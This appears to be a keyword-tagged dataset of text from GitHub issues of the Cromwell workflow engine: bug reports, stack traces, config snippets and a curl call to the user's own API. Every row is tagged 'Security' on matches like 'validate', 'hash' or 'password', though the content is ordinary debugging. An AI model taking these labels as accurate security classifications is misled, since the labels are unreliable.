cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues$(StandardCachingActorHelper.scala:74); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.startMetadataKeyValues$lzycompute(PipelinesApiAsyncBackendJobExecutionActor.scala:534); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.startMetadataKeyValues(PipelinesApiAsyncBackendJobExecutionActor.scala:534); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:951); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:944); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.executeOrRecover(PipelinesApiAsyncBackendJobExecutionActor.sc,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4918:1621,validat,validatedRuntimeAttributes,1621,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4918,1,['validat'],['validatedRuntimeAttributes']
Security,"'main' (reason 1 of 1): Failed to process input declaration 'Directory d = ""/etc""' (reason 1 of 1): Cannot coerce expression of type 'String' to 'Directory'; ```; Despite [coercion](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#type-coercion) from `String` to `Directory` being allowed by the WDL specification and this being among the examples (see [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#task-inputs) and [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#primitive-types)). Surprisingly, you can coerce a `String` into a `Directory` if it comes from an input file:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; }' > main.wdl. $ echo '{; ""main.d"": ""/etc""; }' > main.json; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl -i main.json; Success!; ```. Also puzzling is the following:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; String s = sub(d, ""x"", ""y""); }' > main.wdl; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl; Failed to process workflow definition 'main' (reason 1 of 1): Failed to process declaration 'String s = sub(d, ""x"", ""y"")' (reason 1 of 1): Failed to process expression 'sub(d, ""x"", ""y"")' (reason 1 of 1): Invalid parameter 'IdentifierLookup(d)'. Expected 'File' but got 'Directory'; ```; First of all, it is unclear why womtool claims sub expects a `File`, as the definition of [sub](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#string-substring-string-string) is `String sub(String, String, String)` so `File` is not something that should be expected. Here it should be allowed to coerce `Directory` to `String` the same way as it is allowed to coerce `File` to `String`:; ```; $ echo 'version development. workflow main {; input {; File f; }; String s = sub(f, ""x"", ""y""); }' > main.wdl; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl; Success!; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228:1346,validat,validate,1346,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228,2,['validat'],['validate']
Security,(HttpURLConnection.java:1441); 	at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); 	at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338); 	at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37); 	at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:94); 	at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:981); 	at com.google.cloud.storage.spi.DefaultStorageRpc.write(DefaultStorageRpc.java:564); 	... 24 more; Caused by: javax.net.ssl.SSLException: java.net.SocketException: Broken pipe; 	at sun.security.ssl.Alerts.getSSLException(Alerts.java:208); 	at sun.security.ssl.SSLSocketImpl.fatal(SSLSocketImpl.java:1949); 	at sun.security.ssl.SSLSocketImpl.fatal(SSLSocketImpl.java:1906); 	at sun.security.ssl.SSLSocketImpl.handleException(SSLSocketImpl.java:1870); 	at sun.security.ssl.SSLSocketImpl.handleException(SSLSocketImpl.java:1815); 	at sun.security.ssl.AppOutputStream.write(AppOutputStream.java:128); 	at java.io.BufferedOutputStream.flushBuffer(BufferedOutputStream.java:82); 	at java.io.BufferedOutputStream.flush(BufferedOutputStream.java:140); 	at java.io.PrintStream.flush(PrintStream.java:338); 	at java.io.FilterOutputStream.flush(FilterOutputStream.java:140); 	at com.google.api.client.http.AbstractInputStreamContent.writeTo(AbstractInputStreamContent.java:73); 	at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:79); 	... 26 more; Caused by: java.net.SocketException: Broken pipe; 	at java.net.SocketOutputStream.socketWrite0(Native Method); 	at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109); 	at java.net.SocketOutputStream.write(SocketOutputStream.java:153); 	at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431); 	at sun.security.ssl.OutputRecord.write(OutputRecord.java:417); 	at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876); 	at s,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2183:5771,secur,security,5771,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2183,1,['secur'],['security']
Security,"(Probably related to #4081). . Using cromwell v36. I had the following code block in my wdl:. ```; call MergePileupSummaries as MergeTumorPileups {; input:; input_tables = TumorPileups.pileups,; output_name = , // <--- forgot to specify this input; ref_dict = ref_dict,; gatk_override = gatk_override,; gatk_docker = gatk_docker,; preemptible_attempts = preemptible_attempts,; max_retries = max_retries,; disk_space = ceil(SumSubVcfs.total_size * large_input_to_output_multiplier) + disk_pad; }; ```. Cromwell error didn't give me anything, and `womtool validate` threw an exception:. ```; tsato@gsa5:fc-read-orientation: java -jar womtool-36.jar validate mutect2.wdl; Exception in thread ""main"" scala.MatchError: null; 	at wdl.draft2.model.WdlExpression$.toString(WdlExpression.scala:117); 	at wdl.draft2.model.WdlExpression.toString(WdlExpression.scala:200); 	at wdl.draft2.model.WdlExpression.toWomString(WdlExpression.scala:203); 	at wom.values.WomValue.valueString(WomValue.scala:50); 	at wom.values.WomValue.valueString$(WomValue.scala:50); 	at wdl.draft2.model.WdlExpression.valueString(WdlExpression.scala:185); 	at wdl.draft2.model.WdlWomExpression.sourceString(WdlExpression.scala:219); 	at wom.graph.expression.ExpressionNode$.$anonfun$buildFromConstructor$4(ExpressionNode.scala:66); 	at cats.data.NonEmptyList.map(NonEmptyList.scala:76); 	at wom.graph.expression.ExpressionNode$.$anonfun$buildFromConstructor$3(ExpressionNode.scala:66); 	at cats.data.Validated.leftMap(Validated.scala:203); 	at wom.graph.expression.ExpressionNode$.buildFromConstructor(ExpressionNode.scala:66); 	at wom.graph.expression.AnonymousExpressionNode$.fromInputMapping(AnonymousExpressionNode.scala:17); 	at wdl.draft2.model.WdlWomExpression$.$anonfun$toAnonymousExpressionNode$1(WdlExpression.scala:293); 	at common.validation.ErrorOr$ShortCircuitingFlatMap$.flat; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4570:554,validat,validate,554,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4570,5,"['Validat', 'validat']","['Validated', 'validate', 'validation']"
Security,"(cromwell version 35-5f86a05-SNAP). call caching version from previous run . <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4330:831,PASSWORD,PASSWORDS,831,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4330,1,['PASSWORD'],['PASSWORDS']
Security,") is set to ""soft-link"".; - `path+modtime` - compute an md5 hash of the file path and the last modified time. The same conditions as for ""path"" apply here. [Code: `md5Hex(file.toAbsolutePath.pathAsString + file.lastModifiedTime.toString)`]. Other caching options:. - `system.file-hash-cache` - Prevent repeatedly requesting the hashes of the same files multiple times. - `backend.providers.Local.caching.check-sibling-md5` - will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash. ## My takeaway. - I can't use a `softlink` cache duplication strategy as it's not allowed for containers. - If I select the `path+modtime` hashing strategy, only the first task in a workflow will succeed, as the hard-link duplication strategy will cause the path ""absolute"" be different (causing a hash differential). ## Questions. - ~What defines a cache hit, or exactly which information is used to the call hash?~; > I'll answer this one myself, by looking at the metadata returned from `/api/workflows/{version}/{id}/metadata`, within the `calls.$yourstepname.callCaching`, the hashes field has the following attributes:; > - `output count`; > - `runtime attribute`; > - `output expression`; > - `input count`; > - `backend name`; > - `command template`; > - `input`. - ~When does the command section get hashed (before or after replacements)?~; > The template gets cached. - ~What other elements go into the building the cache?~; > output count, runtime attribute, output expression, input count, backend name, command template, input. - What are the downsides with `check-sibling-md5`, can it be used in conjunction with `system.file-hash-cache`. - **Is the only way to use call-caching with containers without fully hashing the file?**. ## Possible resolutions. I was thinking the following might be potential solutions for my problem, but I don't know how good / bad they are, and they'd require changes to Cromwell. - Potential for ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5346:2511,hash,hash,2511,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5346,1,['hash'],['hash']
Security,") ~[cromwell.jar:0.19]; at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90) ~[cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; ```. AND 8 instances of these:. ```; 2016-05-03 17:58:04,687 cromwell-system-akka.actor.default-dispatcher-18 INFO - JES Run [UUID(d3ba97c6):ValidateReadGroupSamFile:13]: Status change from Running to Success; 2016-05-03 17:58:04,820 cromwell-system-akka.actor.default-dispatcher-8 WARN - Caught exception, retrying: 504 Gateway Time-out; {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; com.google.api.client.googleapis.json.GoogleJsonResponseException: 504 Gateway Time-out; {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnEr",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:6621,Validat,ValidateReadGroupSamFile,6621,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['Validat'],['ValidateReadGroupSamFile']
Security,"), however, if test.wdl is located in the root directory it will be found (`/test.wdl`).; ```; version 1.0. import ""test.wdl"" as test. workflow test2 {; call test.sayHello as blah {; input:; name=""Grog""; }. output {; String out = blah.blah; }; }; ```; test.wdl looks like this:; ```; version 1.0. task sayHello {; input {; String name; }. command {; echo Hello, ~{name}; }. output {; String blah = read_string(stdout()); }; }; ```; The following is mentioned in the printed output:; ```; Failed to import 'test.wdl' (reason 1 of 2): Failed to resolve 'test.wdl' using resolver: 'relative to directory / (without escaping None)' (reason 1 of 1): Import file not found: test.wdl; Failed to import 'test.wdl' (reason 2 of 2): Failed to resolve 'test.wdl' using resolver: 'http importer' (reason 1 of 1): Cannot import 'test.wdl' relative to nothing; ```; Looking at the cromwell source code I suspect the problem lies with the directory path being given to `DirectoryResolver` in `localFilesystemResolvers` ([this line](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/workflow/lifecycle/materialization/MaterializeWorkflowDescriptorActor.scala#L271)). <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3986:2375,PASSWORD,PASSWORDS,2375,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3986,1,['PASSWORD'],['PASSWORDS']
Security,); 	at cromwell.core.path.PathObjectMethods.hashCode$(PathObjectMethods.scala:18); 	at cromwell.filesystems.sra.SraPath.hashCode(SraPathBuilder.scala:26); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.DefaultIoCommand$DefaultIoSizeCommand.hashCode(DefaultIoCommand.scala:14); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.IoPromiseProxyActor$IoCommandWithPromise.hashCode(IoPromiseProxyActor.scala:11); 	at com.google.common.base.Equivalence$Equals.doHash(Equivalence.java:348); 	at com.google.common.base.Equivalence.hash(Equivalence.java:112); 	at com.google.common.cache.LocalCache.hash(LocalCache.java:1696); 	at com.google.common.cache.LocalCache.getIfPresent(LocalCache.java:3956); 	at com.google.common.cache.LocalCache$LocalManualCache.getIfPresent(LocalCache.java:4865); 	at cromwell.engine.io.IoActorProxy$$anonfun$receive$1.applyOrElse(IoActorProxy.scala:25); 	at akka.actor.Actor.aroundReceive(Actor.scala:539); 	at akka.actor.Actor.aroundReceive$(Actor.scala:537); 	at cromwell.engine.io.IoActorProxy.aroundReceive(IoActorProxy.scala:16); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:612); 	at akka.actor.ActorCell.invoke(ActorCell.scala:581); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:268); 	at akka.dispatch.Mailbox.run(Mailbox.scala:229); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.run,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680:1618,hash,hash,1618,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680,1,['hash'],['hash']
Security,"){; call centrifugeDownload {; input:; centrifugeOutput= centrifuge.outputDir,; domain=centrifuge.domain,; database=if defined(centrifuge.database) then centrifuge.database else ""refseq""; }; }; }; ```; The `centrifugeList` is a list of dictionaries. The resulting `centrifuge` `object` may or may not have a key database. . ## Expected behaviour:; `database` defaults to `""refseq""` if no `database` key is present in the dictionary. It will use the database key if it exists. ## Observed behaviour:; ```; java.lang.RuntimeException: Evaluating if defined(centrifuge.database) then centrifuge.database else ""refseq"" failed: Could not find key database in WdlObject; at cromwell.engine.workflow.lifecycle.execution.keys.ExpressionKey.$anonfun$processRunnable$2(ExpressionKey.scala:36); at cromwell.engine.workflow.lifecycle.execution.keys.ExpressionKey.$anonfun$processRunnable$2$adapted(ExpressionKey.scala:31); at scala.Function1.$anonfun$andThen$1(Function1.scala:52); at cats.data.Validated.fold(Validated.scala:14); at cats.data.Validated.bimap(Validated.scala:109); at cats.data.Validated.map(Validated.scala:152); at cromwell.engine.workflow.lifecycle.execution.keys.ExpressionKey.processRunnable(ExpressionKey.scala:31); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.$anonfun$processRunnableTaskCallInputExpression$4(WorkflowExecutionActor.scala:452); at scala.util.Either.flatMap(Either.scala:338); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.$anonfun$processRunnableTaskCallInputExpression$2(WorkflowExecutionActor.scala:449); at scala.util.Either.flatMap(Either.scala:338); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.$anonfun$processRunnableTaskCallInputExpression$1(WorkflowExecutionActor.scala:448); at scala.util.Either.flatMap(Either.scala:338); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.processRunnableTaskCallInputExpression(WorkflowExecutionActor.scala:447); at cromwell.engin",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3093:1074,Validat,Validated,1074,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3093,1,['Validat'],['Validated']
Security,* Makes Cromwell validate that inputs provided were actually wanted by the workflow.; * Adds a validation option to womtool that allows users to validate their inputs json without needing to submit to Cromwell,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3473:17,validat,validate,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3473,3,['validat'],"['validate', 'validation']"
Security,* Re-pin conformance test hash to the current HEAD of master.; * Allow workflow inputs to be recycled back as outputs (part 1/2 fixing conformance 20).; * Allow arrays to be coerced to Anys (part 2/2 fixing conformance 20).; * Fix prefix handling with empty arrays (fix conformance 125).; * Adjust expected conformance failures for all of the above.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3467:26,hash,hash,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3467,1,['hash'],['hash']
Security,"**As a first step -- please confirm that this issue still exists**. It seems that some inputs are being copied over twice to the same path for all tasks. I'm not exactly sure when this started happening but the cromwell git hash we are currently using is https://github.com/broadinstitute/cromwell/tree/c66eabc3582085e28b197b667cb82b241ab6d1dd . Logs in comment. In this example the input_bam and interval_list are listed twice as inputs.; jes operations ID for the following call : operations/EI3Pz-W1KhiNs_ydkKOavrwBIJ-ikOmeDSoPcHJvZHVjdGlvblF1ZXVl; 295959:2016-03-09 18:46:47,375 cromwell-system-akka.actor.default-dispatcher-12 INFO - JesBackend UUID(a7884b2d):HaplotypeCaller:12: Starting call with pre-emptible VM; 295960:2016-03-09 18:46:47,375 cromwell-system-akka.actor.default-dispatcher-12 INFO - JES Pipeline UUID(a7884b2d):HaplotypeCaller:12: Inputs:; 295961: input_bam-0 -> disk:local-disk relpath:broad-gotc-prod-storage/cromwell_execution/PairedEndSingleSampleWorkflow/a7884b2d-e859-4ef3-bb74-b820623755b4/call-GatherBamFiles/M1132.bam; 295964: 2eb61371-0 -> disk:local-disk relpath:broad-gotc-prod-storage/cromwell_execution/PairedEndSingleSampleWorkflow/a7884b2d-e859-4ef3-bb74-b820623755b4/call-GatherBamFiles/M1132.bam; 295965: e1220deb-0 -> disk:local-disk relpath:broad-gotc-prod-storage/cromwell_execution/PairedEndSingleSampleWorkflow/a7884b2d-e859-4ef3-bb74-b820623755b4/call-ScatterIntervalList/glob-cb4648beeaff920acb03de7603c06f98/20scattered.interval_list; 295966: interval_list-0 -> disk:local-disk relpath:broad-gotc-prod-storage/cromwell_execution/PairedEndSingleSampleWorkflow/a7884b2d-e859-4ef3-bb74-b820623755b4/call-ScatterIntervalList/glob-cb4648beeaff920acb03de7603c06f98/20scattered.interval_list; 295968: input_bam_index-0 -> disk:local-disk relpath:broad-gotc-prod-storage/cromwell_execution/PairedEndSingleSampleWorkflow/a7884b2d-e859-4ef3-bb74-b820623755b4/call-GatherBamFiles/M1132.bai",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/576:224,hash,hash,224,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/576,1,['hash'],['hash']
Security,"**Backend:** AWS. **Workflow:** https://github.com/FredHutch/reproducible-workflows/blob/master/WDL/unpaired-panel-consensus-variants-human/broad-containers-workflow.wdl; **First input json:** https://github.com/FredHutch/reproducible-workflows/blob/master/WDL/unpaired-panel-consensus-variants-human/broad-containers-parameters.json; **Second input json is LIKE this one, but refers to a batch of 100 input datasets:** https://github.com/FredHutch/reproducible-workflows/blob/master/WDL/unpaired-panel-consensus-variants-human/broad-containers-batchofOne.json. **Config:** ; Installed the cromwell version in PR #4790. . **Error:**; ```; ""callCaching"": {; ""allowResultReuse"": true,; ""hit"": false,; ""result"": ""Cache Miss"",; ""effectiveCallCachingMode"": ""ReadAndWriteCache"",; ""hitFailures"": [; {; ""dd860da7-bed8-4e70-812c-227f4e6fead8:Panel_BWA_GATK4_Samtools_Var_Annotate_Split.SamToFastq:0"": [; {; ""causedBy"": [; {; ""causedBy"": [],; ""message"": ""The specified copy source is larger than the maximum allowable size for a copy source: 5368709120 (Service: S3, Status Code: 400, Request ID: AE0D7E6A63C706E5)""; }; ],; ""message"": ""[Attempted 1 time(s)] - S3Exception: The specified copy source is larger than the maximum allowable size for a copy source: 5368709120 (Service: S3, Status Code: 400, Request ID: AE0D7E6A63C706E5)""; }; ```. This version of Cromwell does seem to successfully access and copy a cached file from a previous workflow at least on the first task in a shard. This workflow is essentially a batch in which each row of a batch file is passed to a shard and then the tasks run independently on each input dataset and they never gather. However, when the files get larger than the single test data set it seems it can't get to the previous file in order to determine if there's a hit.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4805:1384,access,access,1384,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4805,1,['access'],['access']
Security,"**Not working with ""gzip"":**; ```shell; $ curl \; -X GET \; -H ""Authorization: Bearer $(gcloud auth application-default print-access-token)"" \; -H 'Accept-Encoding: gzip' \; ""https://${CAAS_PROD}/api/workflows/v1/d7923869-af12-4a09-9a5d-fa1aaef84e90/metadata?expandSubWorkflows=false"" \; | wc; % Total % Received % Xferd Average Speed Time Time Time Current; Dload Upload Total Spent Left Speed; 0 0 0 0 0 0 0 0 --:--:-- 0:00:05 --:--:-- 0; curl: (18) transfer closed with outstanding read data remaining; 0 0 0; $ ; ```. **Working with ""identity"":**; ```shell; $ curl \; -X GET \; -H ""Authorization: Bearer $(gcloud auth application-default print-access-token)"" \; -H 'Accept-Encoding: identity' \; ""https://${CAAS_PROD}/api/workflows/v1/d7923869-af12-4a09-9a5d-fa1aaef84e90/metadata?expandSubWorkflows=false"" \; | wc; % Total % Received % Xferd Average Speed Time Time Time Current; Dload Upload Total Spent Left Speed; 100 16.0M 100 16.0M 0 0 740k 0 0:00:22 0:00:22 --:--:-- 1100k; 0 902345 16872427; $ ; ```. NOTE:; This perhaps may only occur on larger (possibly chunked?) payloads. The above json is 16MB decompressed. If required Rex should be able to give you access to this workflow via FC if you want to reproduce this exact case. A/C:; - curl works with gzip encoding for a 16MB+ json response; - regression test to ensure this doesn't re-occur",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4708:64,Authoriz,Authorization,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4708,5,"['Authoriz', 'access']","['Authorization', 'access', 'access-token']"
Security,"**PR**: https://github.com/broadinstitute/cromwell/pull/7224. **Idea:** Add an auth mode for GCP that allows Cromwell to impersonate a service account and use [short-lived credentials](https://cloud.google.com/iam/docs/create-short-lived-credentials-direct) for calls to GCP. . **Context:** Service account impersonation is now the [defacto recommendation](https://cloud.google.com/docs/authentication#auth-decision-tree) when choosing an authentication mechanism that relies on service accounts. Some teams (such as Verily) might prefer this approach over the current option to rely on downloaded service account keys. **How it works**; Users would specify an auth block in the .conf file with one of the following formats. The first specifies . - Application default credentials used for **source service account**; ```; {; name = ""user-service-account""; scheme = ""user_service_account_impersonation""; }; ```. - A specified JSON file used for **source service account**; ```; {; name = ""user-service-account""; scheme = ""user_service_account_impersonation""; json-file= ""path/to/file.json""; }; ```. Users would then add the following option when making workflow requests:; ```; {; ""user_service_account_email"": ""someemail@domain.com; }; ```. Cromwell would use the **source service account** to impersonate the **target service account** from the workflowOptions. It would then mint and refresh access tokens from this target service account for all GCP requests. . In order for this to work, the source service account would need the IAM role roles/iam.serviceAccountTokenCreator. **If the team would prefer a smaller PR**; We could change this to only ever use applicationDefaultCredentials, in which case we could remove parts of the code that are altering ServiceAccountMode",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7223:387,authenticat,authentication,387,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7223,3,"['access', 'authenticat']","['access', 'authentication']"
Security,"*See comment below on how to fix/address*. - cromwell-27-c89c83f-SNAP.jar; - JES backend; - server mode; - local mysql. I have a database block that looks exactly like the one in the example (from the error message), yet I still get the error message. I tried a diff on the database blocks, between the example and my database block, so I am sure that they match. Is this just a mistake in the error message itself? . This is blocking me. The error:. ```; Caused by: java.lang.Exception:; *******************************; ***** DEPRECATION MESSAGE *****; *******************************. Use of configuration path 'database.driver' has been deprecated. Replace with a ""profile"" element instead, e.g:. database {; #driver = ""slick.driver.MySQLDriver$"" #old; profile = ""slick.jdbc.MySQLProfile$"" #new; db {; driver = ""com.mysql.jdbc.Driver""; url = ""jdbc:mysql://host/cromwell?rewriteBatchedStatements=true""; user = ""user""; password = ""pass""; connectionTimeout = 5000; }; }. Cromwell thanks you. at cromwell.services.SingletonServicesStore$.<init>(ServicesStore.scala:70); at cromwell.services.SingletonServicesStore$.<clinit>(ServicesStore.scala); ... 22 more. ```. My conf file for database:; ```; database {; #driver = ""slick.driver.MySQLDriver$""; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.jdbc.Driver""; url = ""jdbc:mysql://localhost/cromwell_24?useSSL=false&rewriteBatchedStatements=true""; user = ""root""; password = ""blahblah""; connectionTimeout = 5000; }; }. ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2217:921,password,password,921,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2217,2,['password'],['password']
Security,"+1 for 1024. On Aug 17, 2016 5:09 PM, ""mcovarr"" notifications@github.com wrote:. > HASH_VALUE in CALL_CACHING_HASH is VARCHAR(255), so we shouldn't have; > this particular problem. But given that the Docker hashes we generate are; > functions of Docker image names and those seem to have the potential to be; > very long, we might want to think about an even larger field.; > ; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > https://github.com/broadinstitute/cromwell/issues/1301#issuecomment-240549174,; > or mute the thread; > https://github.com/notifications/unsubscribe-auth/ACDXkyM0b_81HFK68jJ5Hn71QHaO9qOwks5qg3h-gaJpZM4JmwYu; > .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1301#issuecomment-240592996:207,hash,hashes,207,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1301#issuecomment-240592996,1,['hash'],['hashes']
